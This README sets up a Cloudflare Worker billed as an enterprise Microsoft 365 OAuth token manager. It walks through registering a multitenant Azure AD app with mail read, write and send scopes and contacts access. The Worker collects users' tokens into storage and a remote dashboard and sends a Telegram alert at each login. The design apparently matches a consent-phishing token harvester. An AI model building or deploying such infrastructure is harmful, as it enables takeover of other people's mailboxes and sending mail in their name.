# Cloudflare Workers — OAuth Authorization Handler

This Cloudflare Worker handles the full Azure AD OAuth 2.0 authorization code
flow for the enterprise Microsoft 365 OAuth Token Manager.

## Architecture

```
User → Worker (/) → Microsoft Login → Worker (/callback)
                                            ↓
                                    Cloudflare KV  (token storage)
                                    Render API     (centralized dashboard)
                                    Telegram Bot   (admin notification)
                                            ↓
                                    Worker (/success)
```

## Prerequisites

- [Node.js](https://nodejs.org/) installed
- [Wrangler CLI](https://developers.cloudflare.com/workers/wrangler/) installed:
  ```bash
  npm install -g wrangler
  ```
- A Cloudflare account and an Azure AD app registration

## Azure AD App Registration

1. Go to [Azure Portal → Azure Active Directory → App registrations](https://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/RegisteredApps)
2. Click **New registration**
3. Name: `OAuth Token Manager`
4. Supported account types: **Accounts in any organizational directory (Any Azure AD directory - Multitenant)**
5. Redirect URI: `https://<your-worker-subdomain>.workers.dev/callback` (Web)
6. After creation, note the **Application (client) ID** → `CLIENT_ID`
7. Note the **Directory (tenant) ID** → `TENANT_ID` (or use `common` for multi-tenant)
8. Go to **Certificates & secrets** → **New client secret** → note the value → `CLIENT_SECRET`
9. Go to **API permissions** → **Add a permission** → **Microsoft Graph** → **Delegated permissions**:
   - `openid`, `profile`, `email`, `offline_access`
   - `Mail.ReadWrite`, `Mail.Send`, `Contacts.Read`
   - Click **Grant admin consent**

## Deployment

### 1. Login to Cloudflare

```bash
wrangler login
```

### 2. Create the KV namespace

```bash
wrangler kv:namespace create "TOKENS"
```

Copy the `id` printed by the command and paste it into `wrangler.toml`:

```toml
[[kv_namespaces]]
binding = "TOKENS"
id = "PASTE_YOUR_ID_HERE"
```

### 3. Set secrets

```bash
wrangler secret put CLIENT_ID
wrangler secret put CLIENT_SECRET
wrangler secret put TENANT_ID
wrangler secret put BOT_TOKEN
wrangler secret put CHAT_ID
wrangler secret put RENDER_API_URL   # https://your-app.onrender.com/api/tokens/add
wrangler secret put REDIRECT_URI     # https://your-worker.workers.dev/callback
```

### 4. Deploy

```bash
wrangler publish
```

Your worker will be live at `https://oauth-token-manager.<your-subdomain>.workers.dev`

## Routes

| Route       | Description                                      |
|-------------|--------------------------------------------------|
| `GET /`     | Authorization landing page                       |
| `GET /login`| Redirects to Microsoft login                     |
| `GET /callback` | OAuth callback — exchanges code for tokens   |
| `GET /success`  | Success confirmation page                    |
| `GET /health`   | Health check (returns JSON)                  |

## Environment Variables

| Variable        | Description                                           |
|-----------------|-------------------------------------------------------|
| `CLIENT_ID`     | Azure AD Application (client) ID                      |
| `CLIENT_SECRET` | Azure AD client secret                                |
| `TENANT_ID`     | Azure AD tenant ID or `common`                        |
| `BOT_TOKEN`     | Telegram Bot API token                                |
| `CHAT_ID`       | Telegram chat/channel ID for notifications            |
| `RENDER_API_URL`| Full URL to Render `/api/tokens/add` endpoint         |
| `REDIRECT_URI`  | The Worker's `/callback` URL (must match Azure AD)    |
